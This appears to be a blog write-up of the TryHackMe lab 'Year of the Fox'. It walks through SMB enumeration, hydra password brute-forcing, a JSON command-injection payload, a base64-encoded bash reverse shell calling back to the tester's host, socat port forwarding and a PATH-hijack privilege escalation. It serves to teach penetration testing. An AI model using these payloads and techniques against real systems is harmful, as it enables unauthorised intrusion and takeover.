---
title: "Year of the fox"
description: "A hard-level TryHackMe room featuring SMB enumeration, command injection, and privilege escalation."
---


![Generic-Banner-1](https://github.com/user-attachments/assets/acad4e3d-1aaf-44ba-9fe0-27be2b2ae20b)  

`Date : Sep 15 2025`

[Year of the Fox](https://tryhackme.com/room/yotf) is a Hard Level TryHackMe room focusing on SMB Enumeration, Coomand Injection, Privilege escalation and more.
### Table of content

1. [Recon](#recon)
	1. [Port-445](#port-445)
	2. [Port 80](#port-80)
2. [Remote code execution](#remote-code-execution)
3. [Shell as www-data](#shell-as-www-data)
4. [Shell as fox](#shell-as-fox)
5. [Shell as root](#shell-as-root)
6. [Conclusion](#conclusion)

### Recon 

First we will gather some information about the server.

**Nmap**

Scanning for the open ports on the server.

```bash
sudo nmap -Pn 10.10.20.219 -p- --min-rate 5000 -oN open-ports.txt
```

Output :

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 14:08 IST
Nmap scan report for 10.10.20.219
Host is up (0.16s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 15.36 seconds
```

As we can see there are only three ports open on the server so now we can further scan those three ports.

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 14:14 IST
Nmap scan report for 10.10.20.219
Host is up (0.25s latency).

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
|_clock-skew: mean: -20m00s, deviation: 34m37s, median: -1s
| smb2-time: 
|   date: 2025-09-15T08:45:10
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2025-09-15T09:45:10+01:00
|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

There are some important piece of information revealed here -

- Apache server is running on port 80.
- Port 139 running netbios service that provide name resolution service to the older version of the SMB.
- Port 445 running the `Server Message Block` service which is used to share files and printers on the network.
- Operating System : Ubuntu
- Host : year-of-the-fox.lan

#### Port 445

We can try to list the available shares through anonymous login uisng `smbclient` :

```
smbclient -N -L //10.10.20.219
```

```
	Sharename       Type      Comment
	---------       ----      -------
	yotf            Disk      Fox's Stuff -- keep out!
	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

so there is one intersting share named `yotf` so we can try to list it's contents -

```bash
smbclient -N //10.10.20.219/yotf
```

Output :

```
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Oh! We can not surf the share anonymously.

We can use the tool `enum4linux` for enumerating the samba :

```bash
enum4linux 10.10.20.219
```

From the output we got the most important piece of information  :

```
S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)
```

Now we know about two users - `fox` and `rascal`

#### Port 80

Using the two discovered usernames we can try to bruteforce the password using hydra -

```bash
hydra -l rascal -P rockyou.txt http-get://10.10.219.226
```


Output :

```
[80][http-get] host: 10.10.219.226   login: rascal   password: geegee
```


Hohu! We got the password now with this creds we can login to the apache server -


<img width="1802" height="928" alt="Screenshot From 2025-09-16 15-34-09" src="https://github.com/user-attachments/assets/0c9bdd63-c8a9-4b90-a2bc-685a7f858379" />


Whatever we enter in the search bar it says "No file returned" -

![Screenshot From 2025-09-16 18-17-48.png](:/997f6ecca5df4f63bb1fbff6b4c6771d)
<img width="1802" height="928" alt="Screenshot From 2025-09-16 18-17-48" src="https://github.com/user-attachments/assets/ea8e7fc9-d830-4a9c-8bc2-d729ce711bd4" />

but wait when pressing search without any input it gives -

<img width="1802" height="928" alt="Screenshot From 2025-09-16 18-19-51" src="https://github.com/user-attachments/assets/21512377-0e9a-4456-a9eb-2e9a38f65a8c" />


Now the problem is when we search for any of this file we get thier name as the response.

### Remote code execution

Here we can intercept the request in Caido and see what parameters are sent by the application :

<img width="679" height="409" alt="Screenshot From 2025-09-17 12-39-28" src="https://github.com/user-attachments/assets/68f30773-e399-46fb-b643-80198d7f40f9" />


The application is sending the data in the target field and the type of the body is json. I tried to do LFI attack but failed but when i am sending any chracter like '&' it says "Invalid Character".

<img width="1341" height="594" alt="Screenshot From 2025-09-17 12-51-38" src="https://github.com/user-attachments/assets/23f161be-98b9-4884-afec-324beb5e44ca" />


This indicates the presence of OS command injection vulnerability.

To send any command in the json type we have to enclose it in double quotes and also espace that quotes uisng ""\"" (backward slash). In linux we can seprate commands using ";" semiclonon after following this rules the working payload is :

```json
{"target":"\"\n ping -c 1 10.21.207.183 \n \""}
```

To check whether we are recieving any icmp packet or not we can use [ICMP Notifier](https://github.com/Daviey/ICMP-notifier).

```
ICMP-notifier -ip 10.21.207.183
```

Response : 

<img width="896" height="76" alt="Screenshot From 2025-09-17 13-08-31" src="https://github.com/user-attachments/assets/1ec688da-7d0f-4de6-879b-5ff99fbb205e" />


We got RCE!!

### Shell as www-data 

When I was trying to enter the reverse shell payload I was getting "Invalid Character" in the response so the simple way bypass this is using base64 encoding -

```
echo "bash -c 'bash -i >& /dev/tcp/10.21.207.183/4000 0>&1'" | base64
```

```
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMS4yMDcuMTgzLzQwMDAgMD4mMScgCg==
```

Request Body - 

```
{"target":"\"\n echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMS4yMDcuMTgzLzQwMDAgMD4mMScgCg= | base64 -d | bash \n \""}
```

<img width="896" height="229" alt="Screenshot From 2025-09-17 13-22-49" src="https://github.com/user-attachments/assets/2ace413f-5e2d-4f13-a4e8-a317e5a1db7e" />



We got the shell as www-data and now we can see the content of the search.php -

```php
<?php
	if($_SERVER["REQUEST_METHOD"] != "POST"){
		echo "Uh oh, something went wrong!";
	} else {
		$target = json_decode(file_get_contents("php://input"));
		if (strpos($target->target, "&") !== false || strpos($target->target, "$") !==false){
			echo json_encode(["Invalid Character"]);
			exit();
		}
		$query = exec("find ../../../files/* -iname \"*$target->target*\" | xargs");
		if (strlen($query) < 1){
			echo json_encode(["No file returned"]);
		} else{
			$queryArr = explode(" ", $query);
			foreach($queryArr as $key => $tmp){
				$queryArr[$key] = str_replace("../../../files/", "", $tmp);
			}
			echo json_encode($queryArr);
		}
	}
?>
```

Explaination fo execution flow :

1. Checks whether the request method is POST or not.
2. fetches the json body from the request and runs josn_decode function on it to get the value of the "target" field.
3. Checks for "&" and "$" in the input if present it will return "Invalid Character".
4. Executes the command "find ../../../files/* -iname \"*$target->target*\" | xargs" to find the file with the user specified name and then pipe it into xargs command that converts the output of one command to use as arguments for another.
5. Split the output of the command into array remove the "../../../files/" and encode it as json and send in response.

From the file we can see the three files are stored in "/var/www/files" directory so we can see the content of all the three files -

- 2 Files - fox.txt and important-data.txt is empty but the creds2.txt contains : LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAX
UTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=

I tried using this as creds for smb as well as the website but nothing worked so seems like its a rabbit hole.

### Shell as fox

Moving on the services we can see following services running on the server :

```
netstat -tulwn
```

```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:netbios-ssn     0.0.0.0:*               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 localhost:ssh           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:microsoft-ds    0.0.0.0:*               LISTEN     
tcp6       0      0 [::]:netbios-ssn        [::]:*                  LISTEN     
tcp6       0      0 [::]:http               [::]:*                  LISTEN     
tcp6       0      0 [::]:microsoft-ds       [::]:*                  LISTEN     
udp        0      0 ip-10-10-255:netbios-ns 0.0.0.0:*                          
udp        0      0 ip-10-10-95-:netbios-ns 0.0.0.0:*                          
udp        0      0 0.0.0.0:netbios-ns      0.0.0.0:*                          
udp        0      0 ip-10-10-25:netbios-dgm 0.0.0.0:*                          
udp        0      0 ip-10-10-95:netbios-dgm 0.0.0.0:*                          
udp        0      0 0.0.0.0:netbios-dgm     0.0.0.0:*                          
udp        0      0 localhost:domain        0.0.0.0:*                          
udp        0      0 ip-10-10-95-190.:bootpc 0.0.0.0:*                          
raw6       0      0 [::]:ipv6-icmp          [::]:*     
```

huh! SSH is running on localhost to validate we can check the conf file (/etc/ssh/sshd_config) :

- From the file two lines were most interesting
	- ListenAddress 127.0.0.1 
	- AllowUsers fox

So this clearifies the ssh is running on localhost and only "fox" can login through it. Here we can do port forwarding and perform bruteforcing the password.

For this purpose we will use [socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) and to  transfer it to the target server we can use python server 

```
python3 -m http.server
```

download socat on the target server -

```
cd /tmp
wget http://<IP>:8000/socat 
chmod +x /tmp/socat
```

```
/tmp/socat TCP-LISTEN:8000,fork TCP:127.0.0.1:22
```

On our machine -

```
hydra -l fox -P ~/rockyou.txt ssh://10.10.95.190:8000
```

<img width="1853" height="314" alt="Screenshot From 2025-09-17 19-47-06" src="https://github.com/user-attachments/assets/2fea0004-d188-4b66-b9bb-bb234607c2fb" />



```
ssh fox@10.10.95.190 -p 8000
```

<img width="895" height="343" alt="Screenshot From 2025-09-17 19-50-29" src="https://github.com/user-attachments/assets/1c09b5b7-88d8-4765-a955-4704e8f98b83" />


Cool! we got the access as fox an0d so the user flag.

### Shell as root

Let's check which binary has SUID set so we can exploit it to esclate over privilges to root - 

```
sudo -l
```

Output :

```
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
```

On `/usr/sbin/shutdown` SUID is set so transfer it our machine using python server,

```bash
kris3c@0x4B1T-ubuntu:~/Main/TryHackMe/year-of-the-fox$ file shutdown

shutdown: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c855d329bb81903275997549d0856f9fcb1d40fd, not stripped
```

Opening it in ghidra and looking at the decompiler :

<img width="1004" height="343" alt="Screenshot From 2025-09-17 21-35-53" src="https://github.com/user-attachments/assets/0436a60d-5add-496f-a6aa-47938d00f94c" />

The binary is simpy calling the system function to execute the poweroff binary but thing to note here is it does not use the absolute path and if we look at the `sudo -l` ouput we can see that it does not uses `secure_path` to specify where to look the binary. 

How we can exploit this ? 

The steps are easy to follow -

1. Adding our own shutdown binary in /tmp/ with content :
	-  ```
	   #!/bin/bash
	   /bin/sh
	   ```
	  
2. adding `/tmp` to the `$PATH` environment variable (but at the starting so the binary look for the binary in the /tmp directory).
3. Running command -
	- ```
	  export PATH="/tmp:$PATH"; sudo /usr/sbin/shutdown
	  ```

<img width="863" height="136" alt="Screenshot From 2025-09-17 22-15-15" src="https://github.com/user-attachments/assets/725fdf9c-25bf-4e7f-ad39-3ddad63f6d9a" />

so we got the root access but the `/root/flag.txt` says `Not here -- go find!`. 

Let's find files having access only limited to root-

```
find /home -type f -group root
```

```
/home/rascal/.did-you-think-I-was-useless.root
/home/fox/user-flag.txt
/home/fox/samba/cipher.txt
```

```
cat /home/rascal/.did-you-think-I-was-useless.root
```

```
T
H
M
{RA
DAC
TED}
```

We got the root flag and this marks the end of the writeup.

### Conclusion 

This machine demonstrated the importance of thorough enumeration, as weak credentials and misconfigured services led to remote code execution. By chaining an injection flaw with local privilege escalation via insecure PATH handling, full root compromise was achieved. It highlights how small misconfigurations can quickly escalate into complete system takeover.


